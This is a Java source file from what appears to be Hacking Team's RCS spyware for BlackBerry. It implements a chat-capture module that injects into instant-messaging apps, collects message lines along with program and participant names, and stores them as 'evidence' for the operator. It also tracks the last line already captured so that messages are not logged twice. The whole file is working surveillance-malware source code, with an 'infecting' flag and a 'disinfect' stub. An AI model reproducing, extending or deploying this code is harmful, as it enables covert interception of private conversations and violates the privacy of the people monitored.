//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.util.Vector;

import net.rim.device.api.ui.UiApplication;
import blackberry.Device;
import blackberry.Messages;
import blackberry.config.ConfModule;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.evidence.LineMarkup;
import blackberry.injection.InjectorManager;
import blackberry.injection.injectors.group.ChatGroupInjector;
import blackberry.manager.ModuleManager;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * Instant Message.
 */
public final class ModuleChat extends BaseModule {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModChat", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private static final long APP_TIMER_PERIOD = 5000;

    LineMarkup markup;
    boolean infecting = false;

    //boolean enableInfect;
    boolean isAppForeground;

    private boolean unsupported;

    public static String getStaticType() {
        return Messages.getString("1a.0"); //"chat"; //$NON-NLS-1$
    }

    public static ModuleChat getInstance() {
        return (ModuleChat) ModuleManager.getInstance().get(getStaticType());
    }

    /**
     * Instantiates a new task agents
     * 
     * @param agentStatus
     *            the agent status
     */
    public ModuleChat() {

    }

    protected boolean parse(ConfModule conf) {
        //#ifdef DEBUG
        debug.trace("parse"); //$NON-NLS-1$
        //#endif

        //TODO: verificare come si comporta con OS < 5!
        if (!Device.getInstance().atLeast(4, 0)) {
            //#ifdef DEBUG
            debug.error("ChatAgent: not supported before OS 5.0"); //$NON-NLS-1$
            //#endif
            enable(false);
            setDelay(NEVER);
            return false;
        }

        setPeriod(NEVER);
        setDelay(SOON);

        markup = new LineMarkup(getStaticType());

        //#ifdef DEBUG
        debug.trace("parse end");
        //#endif
        return true;
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart"); //$NON-NLS-1$
        //#endif

        if (unsupported) {
            return;
        }

        ChatGroupInjector.enableGroup(true);
        UiApplication.getUiApplication().invokeAndWait(new Runnable() {

            public void run() {
                InjectorManager.getInstance().start();
            }
        });

    }

    public void actualLoop() {
        if (unsupported) {
            return;
        }
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop"); //$NON-NLS-1$
        //#endif

        ChatGroupInjector.enableGroup(false);
        InjectorManager.getInstance().stop();
    }

    private synchronized void serialize(String program, String partecipants,
            String lastLine) {
        //#ifdef DEBUG
        debug.trace("serialize: " + lastLine); //$NON-NLS-1$
        //#endif

        if (!markup.isMarkup()) {
            markup.createEmptyMarkup();
        }

        markup.put(program + " : " + partecipants, lastLine);
    }

    private synchronized String unserialize(String program, String partecipants) {
        //#ifdef DEBUG
        debug.trace("unserialize: " + partecipants); //$NON-NLS-1$
        //#endif

        if (markup.isMarkup()) {
            String lastLine = markup.getLine(program + " : " + partecipants);

            //#ifdef DEBUG
            debug.trace("unserialized: " + lastLine); //$NON-NLS-1$
            //#endif
            return lastLine;
        }

        return null;
    }

    private void writeEvidence(String program, String partecipants,
            Vector lines, int startFrom) {
        //#ifdef DEBUG
        debug.trace("writeEvidence"); //$NON-NLS-1$
        //#endif

        //#ifdef DBC
        Check.requires(lines != null, "Null lines"); //$NON-NLS-1$
        Check.requires(lines.size() > startFrom,
                "writeEvidence wrong startFrom: " + startFrom); //$NON-NLS-1$
        //#endif

        String imname = program; //$NON-NLS-1$
        String topic = ""; //$NON-NLS-1$
        String users = partecipants;

        DateTime datetime = new DateTime();
        final Vector items = new Vector();

        for (int i = startFrom; i < lines.size(); i++) {

            String chatcontent = (String) lines.elementAt(i);

            items.addElement(datetime.getStructTm());
            items.addElement(WChar.getBytes(imname, true));
            items.addElement(WChar.getBytes(topic, true));
            items.addElement(WChar.getBytes(users, true));
            items.addElement(WChar.getBytes(chatcontent, true));
            items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
        }

        Evidence evidence = new Evidence(EvidenceType.CHAT);
        evidence.atomicWriteOnce(items);

    }

    public synchronized void addLines(String program, String partecipants,
            Vector lines) {
        if (lines == null) {
            //#ifdef DEBUG
            debug.error("add: null lines"); //$NON-NLS-1$
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.trace("add: " + program + " part: " + partecipants + " lines: " + lines.size()); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        if (lines.size() == 0) {
            //#ifdef DEBUG
            debug.trace("add: no lines, skipping"); //$NON-NLS-1$
            //#endif
            return;
        }

        //#ifdef DBC
        Check.asserts(lines != null, "null lines"); //$NON-NLS-1$
        //#endif

        String lastLine = unserialize(program, partecipants);

        if (lines.lastElement().equals(lastLine)) {
            //#ifdef DEBUG
            debug.trace("add: nothing new"); //$NON-NLS-1$
            //#endif
            return;
        }

        int lastEqual;
        for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
            if (lines.elementAt(lastEqual).equals(lastLine)) {
                //#ifdef DEBUGs
                debug.trace("add found equal at line: " + lastEqual); //$NON-NLS-1$
                //#endif
                break;
            }
        }

        if (lastEqual <= 0) {
            lastEqual = -1;
            //#ifdef DEBUG
            debug.info("add: no found, save everything."); //$NON-NLS-1$
            //#endif
        }

        try {
            lastLine = (String) lines.lastElement();
            //#ifdef DEBUG
            debug.trace("add, serialize lastLine: " + lastLine); //$NON-NLS-1$
            //#endif

            serialize(program, partecipants, lastLine);
            //#ifdef DEBUG
            debug.trace("write evidence from line: " + lastEqual + 1); //$NON-NLS-1$
            //#endif
            writeEvidence(program, partecipants, lines, lastEqual + 1);

            //#ifdef DEBUG
            debug.trace("add end"); //$NON-NLS-1$
            //#endif
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("add: " + ex); //$NON-NLS-1$
            //#endif
        }
        return;
    }

    //#ifdef DEBUG
    public void disinfect() {

    }
    //#endif

}
